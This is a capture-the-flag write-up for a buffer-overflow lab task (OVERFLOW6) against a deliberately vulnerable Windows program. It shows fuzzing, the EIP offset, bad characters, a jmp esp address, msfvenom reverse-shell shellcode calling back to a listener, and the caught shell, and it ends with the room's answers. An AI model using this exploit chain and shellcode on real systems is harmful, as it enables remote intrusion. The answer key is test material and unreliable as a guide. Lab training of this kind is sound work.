# OVERFLOW6
## Mona Configuration
```
!mona config -set workingfolder C:\mona\%p
```
## Fuzzing
```
user@arch:~/cyber/thm/bufferoverflowprep/OVERFLOW 6$ ./fuzzer.py
Fuzzing with 100 bytes
Fuzzing with 200 bytes
Fuzzing with 300 bytes
Fuzzing with 400 bytes
Fuzzing with 500 bytes
Fuzzing with 600 bytes
Fuzzing with 700 bytes
Fuzzing with 800 bytes
Fuzzing with 900 bytes
Fuzzing with 1000 bytes
Fuzzing with 1100 bytes
Fuzzing crashed at 1100 bytes
```
## Controlling EIP
```
user@arch:~/cyber/thm/bufferoverflowprep/OVERFLOW 6$ cyclic 1500
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaaezaafbaafcaafdaafeaaffaafgaafhaafiaafjaafkaaflaafmaafnaafoaafpaafqaafraafsaaftaafuaafvaafwaafxaafyaafzaagbaagcaagdaageaagfaaggaaghaagiaagjaagkaaglaagmaagnaagoaagpaagqaagraagsaagtaaguaagvaagwaagxaagyaagzaahbaahcaahdaaheaahfaahgaahhaahiaahjaahkaahlaahmaahnaahoaahpaahqaahraahsaahtaahuaahvaahwaahxaahyaahzaaibaaicaaidaaieaaifaaigaaihaaiiaaijaaikaailaaimaainaaioaaipaaiqaairaaisaaitaaiuaaivaaiwaaixaaiyaaizaajbaajcaajdaajeaajfaajgaajhaajiaajjaajkaajlaajmaajnaajoaajpaajqaajraajsaajtaajuaajvaajwaajxaajyaajzaakbaakcaakdaakeaakfaakgaakhaakiaakjaakkaaklaakmaaknaakoaakpaakqaakraaksaaktaakuaakvaakwaakxaakyaakzaalbaalcaaldaaleaalfaalgaalhaaliaaljaalkaallaalmaalnaaloaalpaalqaalraalsaaltaaluaalvaalwaalxaalyaalzaambaamcaamdaameaamfaamgaamhaamiaamjaamkaamlaammaamnaamoaampaamqaamraamsaamtaamuaamvaamwaamxaamyaamzaanbaancaandaaneaanfaangaanhaaniaanjaankaanlaanmaannaanoaanpaanqaanraansaantaanuaanvaanwaanxaanyaanzaaobaaocaaodaaoeaaofaaogaaohaaoiaaojaaokaaolaaomaaonaaooaaopaaoqaaoraaosaaotaaouaaovaaowaaoxaaoyaao
```
Program crashes with `616A6B61` in EIP register
```
user@arch:~/cyber/thm/bufferoverflowprep/OVERFLOW 6$ python -c 'print(bytes.fromhex("616A6B61")[::-1].decode())'
akja
```
```
user@arch:~/cyber/thm/bufferoverflowprep/OVERFLOW 6$ cyclic -l akja
1034
```
Offset to EIP is `1034` bytes
## Finding Bad Chars
Create bytearray in Immunity:
```
!mona bytearray -b "\x00"
```
Create bytearray for `exploit.py`:
```
user@arch:~/cyber/thm/bufferoverflowprep/OVERFLOW 6$ python -c '[print("\\x" + "{:02x}".format(x), end="") for x in range(1,256)]'
\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff
```
Re-run `exploit.py` and then do comparison in Immunity:
```
!mona compare -f C:\mona\oscp\bytearray.bin -a 017FFA30
```
```
mona Memory comparison results
Address                    Status                     BadChars                   Type                       Location
0x017ffa30                 Corruption after 7 bytes   00 08 09 2c 2d ad ae       normal                     Stack
```
Bad chars: `\x00\x08\x2c\xad`
## Finding a Jump Point
```
!mona jmp -r esp -b "\x00\x08\x2c\xad"
```
```
Log data, item 11
 Address=625011AF
 Message=  0x625011af : jmp esp |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Users\admin\Desktop\vulnerable-apps\oscp\essfunc.dll)
```
We will jump to address `\xaf\x11\x50\x62`
## Payload
```
user@arch:~/cyber/thm/bufferoverflowprep/OVERFLOW 6$ msfvenom -p windows/shell_reverse_tcp LHOST=10.6.23.1 LPORT=4444 EXITFUNC=thread -b "\x00\x08\x2c\xad" -f c
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 12 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 351 (iteration=0)
x86/shikata_ga_nai chosen with final size 351
Payload size: 351 bytes
Final size of c file: 1506 bytes
unsigned char buf[] =
"\xbb\x45\x9d\xa1\x82\xd9\xcf\xd9\x74\x24\xf4\x58\x31\xc9"
"\xb1\x52\x83\xc0\x04\x31\x58\x0e\x03\x1d\x93\x43\x77\x61"
"\x43\x01\x78\x99\x94\x66\xf0\x7c\xa5\xa6\x66\xf5\x96\x16"
"\xec\x5b\x1b\xdc\xa0\x4f\xa8\x90\x6c\x60\x19\x1e\x4b\x4f"
"\x9a\x33\xaf\xce\x18\x4e\xfc\x30\x20\x81\xf1\x31\x65\xfc"
"\xf8\x63\x3e\x8a\xaf\x93\x4b\xc6\x73\x18\x07\xc6\xf3\xfd"
"\xd0\xe9\xd2\x50\x6a\xb0\xf4\x53\xbf\xc8\xbc\x4b\xdc\xf5"
"\x77\xe0\x16\x81\x89\x20\x67\x6a\x25\x0d\x47\x99\x37\x4a"
"\x60\x42\x42\xa2\x92\xff\x55\x71\xe8\xdb\xd0\x61\x4a\xaf"
"\x43\x4d\x6a\x7c\x15\x06\x60\xc9\x51\x40\x65\xcc\xb6\xfb"
"\x91\x45\x39\x2b\x10\x1d\x1e\xef\x78\xc5\x3f\xb6\x24\xa8"
"\x40\xa8\x86\x15\xe5\xa3\x2b\x41\x94\xee\x23\xa6\x95\x10"
"\xb4\xa0\xae\x63\x86\x6f\x05\xeb\xaa\xf8\x83\xec\xcd\xd2"
"\x74\x62\x30\xdd\x84\xab\xf7\x89\xd4\xc3\xde\xb1\xbe\x13"
"\xde\x67\x10\x43\x70\xd8\xd1\x33\x30\x88\xb9\x59\xbf\xf7"
"\xda\x62\x15\x90\x71\x99\xfe\x95\x83\xb6\xff\xc1\x89\xb8"
"\xee\x4d\x07\x5e\x7a\x7e\x41\xc9\x13\xe7\xc8\x81\x82\xe8"
"\xc6\xec\x85\x63\xe5\x11\x4b\x84\x80\x01\x3c\x64\xdf\x7b"
"\xeb\x7b\xf5\x13\x77\xe9\x92\xe3\xfe\x12\x0d\xb4\x57\xe4"
"\x44\x50\x4a\x5f\xff\x46\x97\x39\x38\xc2\x4c\xfa\xc7\xcb"
"\x01\x46\xec\xdb\xdf\x47\xa8\x8f\x8f\x11\x66\x79\x76\xc8"
"\xc8\xd3\x20\xa7\x82\xb3\xb5\x8b\x14\xc5\xb9\xc1\xe2\x29"
"\x0b\xbc\xb2\x56\xa4\x28\x33\x2f\xd8\xc8\xbc\xfa\x58\xe8"
"\x5e\x2e\x95\x81\xc6\xbb\x14\xcc\xf8\x16\x5a\xe9\x7a\x92"
"\x23\x0e\x62\xd7\x26\x4a\x24\x04\x5b\xc3\xc1\x2a\xc8\xe4"
"\xc3";
```
## Exploit
```
user@arch:~/cyber/thm/bufferoverflowprep/OVERFLOW 6$ ./exploit.py
Sending evil buffer...
Done!
```
```
user@arch:~/cyber/thm/bufferoverflowprep/OVERFLOW 6$ nc -lnvp 4444
Connection from 10.10.175.52:49372
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Users\admin\Desktop\vulnerable-apps\oscp>
```
## Questions
What is the EIP offset for OVERFLOW6?
```
1034
```
In byte order (e.g. \\x00\\x01\\x02) and including the null byte \\x00, what were the badchars for OVERFLOW6?
```
\x00\x08\x2c\xad
```